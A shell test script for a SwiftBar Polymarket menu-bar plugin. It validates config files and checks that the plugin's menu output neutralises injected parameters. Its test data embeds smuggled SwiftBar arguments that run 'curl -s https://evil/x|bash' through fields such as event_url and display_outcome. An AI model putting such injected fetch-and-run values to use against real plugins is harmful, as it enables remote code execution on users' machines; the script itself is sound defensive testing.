#!/usr/bin/env bash
set -euo pipefail

repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
config_path="$repo_dir/examples/republicans-2028-presidential-election.json"

python3 -m json.tool "$repo_dir/config/markets.example.json" >/dev/null
for example in "$repo_dir"/examples/*.json; do
  [[ -e "$example" ]] || continue
  python3 -m json.tool "$example" >/dev/null
done
if [[ -f "$repo_dir/config/markets.json" ]]; then
  python3 -m json.tool "$repo_dir/config/markets.json" >/dev/null
  config_path="$repo_dir/config/markets.json"
fi
python3 -m py_compile "$repo_dir/swiftbar/polymarket-toolbar.5m.py"

REPO_DIR="$repo_dir" python3 - <<'PY'
import contextlib
import io
import os
from pathlib import Path

repo_dir = Path(os.environ["REPO_DIR"])
source = (repo_dir / "swiftbar" / "polymarket-toolbar.5m.py").read_text()
prefix = source.rsplit('\nif __name__ == "__main__":', 1)[0]
ns = {"__file__": str((repo_dir / "swiftbar" / "polymarket-toolbar.5m.py").resolve())}
exec(compile(prefix, "polymarket-toolbar.5m.py", "exec"), ns)

malicious_url = (
    'https://polymarket.com/ bash=/bin/bash param1=-c '
    'param2="curl -s https://evil/x|bash" terminal=false'
)
malicious_outcome = (
    'Yes | bash=/bin/bash param1=-c '
    'param2="curl -s https://evil/y|bash" terminal=false'
)
specs = [
    {
        "key": "pwn",
        "bar": "Markets",
        "bar_short": "Markets",
        "name": "Markets",
        "question": "x",
        "event_url": malicious_url,
        "market_id": "123",
        "market_slug": "pwn",
        "display_outcome": malicious_outcome,
        "display_label": "bad|label",
        "end": "2026-07-01T00:00:00Z",
        "color": (52, 211, 153),
        "color_hex": "#34d399",
    }
]
markets = {
    "pwn": {
        "mid": 0.5,
        "bid": 0.49,
        "ask": 0.51,
        "history": [{"t": 0, "p": 0.5}],
        "fetched_at": 1780000000,
    }
}
buffer = io.StringIO()
with contextlib.redirect_stdout(buffer):
    ns["print_menu"](
        specs,
        markets,
        {"show_mini_chart_on_multi_display": False},
        Path("/tmp/config.json"),
        [],
    )
output = buffer.getvalue()
param_regions = [line.split("|", 1)[1] for line in output.splitlines() if "|" in line]
for params in param_regions:
    assert "bash=/bin/bash" not in params, params
    assert "param1=-c" not in params, params
    assert "terminal=false" not in params, params
assert "Open page | bash=/usr/bin/open" not in output
assert "Yes / bash=/bin/bash" in output
assert "bad/label" in output
PY

POLYMARKET_SWIFTBAR_CONFIG="$config_path" \
  "$repo_dir/swiftbar/polymarket-toolbar.5m.py" | sed -n '1,12p'
